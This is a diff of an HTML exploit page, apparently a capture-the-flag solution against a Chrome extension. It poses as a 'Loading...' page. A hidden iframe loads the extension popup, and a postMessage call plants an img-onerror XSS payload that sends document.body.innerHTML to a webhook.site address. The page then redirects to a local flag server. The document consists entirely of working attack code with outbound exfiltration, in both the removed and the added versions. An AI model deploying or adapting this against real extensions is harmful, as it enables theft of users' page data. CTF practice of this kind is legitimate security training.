@@ -1,27 +1,70 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Loading...</title>
+</head>
 <body>
-    <marquee>test</marquee>
+    <h1>Please wait...</h1>
+    <p id="status">Loading...</p>
+    
     <script>
-        setTimeout(() => {
-            const img = document.querySelector('img[alt="STOP"]');
-            if (img) {
-                const extId = img.src.split('/')[2];
+        // Configuration
+        const WEBHOOK = "https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a";
+        const EXTENSION_ID = "bmmpcfceonpbmofjdlajmajopjgfdmal"; // Calculated from /app/TagDeprecater
+        
+        // Malicious payload to inject
+        const PAYLOAD = `<img src=x onerror="fetch('${WEBHOOK}/flag?data='+encodeURIComponent(document.body.innerHTML))">`;
+        
+        async function exploit() {
+            try {
+                document.getElementById('status').textContent = 'Loading extension popup...';
+                console.log('[*] Creating iframe to load popup.html');
+                
+                // Create iframe pointing to extension popup
                 const iframe = document.createElement('iframe');
-                iframe.src = `chrome-extension://${extId}/popup.html`;
                 iframe.style.display = 'none';
+                iframe.src = `chrome-extension://${EXTENSION_ID}/popup.html`;
+                
+                // Wait for popup to load
                 iframe.onload = () => {
-                    // Payload that fetches the flag
-                    const payload = `<img src=x onerror="fetch('http://localhost:1337').then(r=>r.text()).then(t=>{const m=t.match(/<marquee>([^<]+)<\\/marquee>/);if(m)fetch('https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a?flag='+m[1])})">`;
+                    console.log('[+] Popup loaded successfully!');
+                    document.getElementById('status').textContent = 'Injecting malicious payload...';
+                    
+                    // Send malicious payload via postMessage
+                    // popup.js has a message listener that will store this in chrome.storage
                     iframe.contentWindow.postMessage({
                         type: "SET",
-                        replacementString: payload
+                        replacementString: PAYLOAD
                     }, "*");
-                    setTimeout(() => location.href = 'http://localhost:1337', 1000);
+                    
+                    console.log('[+] Payload sent to extension');
+                    document.getElementById('status').textContent = 'Payload injected! Redirecting...';
+                    
+                    // Wait a moment for chrome.storage to update, then redirect to flag server
+                    setTimeout(() => {
+                        console.log('[+] Redirecting to http://localhost:1337');
+                        window.location.href = 'http://localhost:1337';
+                    }, 1000);
                 };
+                
+                iframe.onerror = () => {
+                    console.log('[-] Failed to load extension popup');
+                    document.getElementById('status').textContent = 'Error loading extension';
+                };
+                
                 document.body.appendChild(iframe);
+                
+            } catch (error) {
+                console.error('[-] Exploit failed:', error);
+                document.getElementById('status').textContent = 'Exploit failed: ' + error.message;
             }
-        }, 2000);
+        }
+        
+        // Start exploit when page loads
+        window.addEventListener('load', () => {
+            console.log('[*] Page loaded, starting exploit...');
+            exploit();
+        });
     </script>
 </body>
 </html>
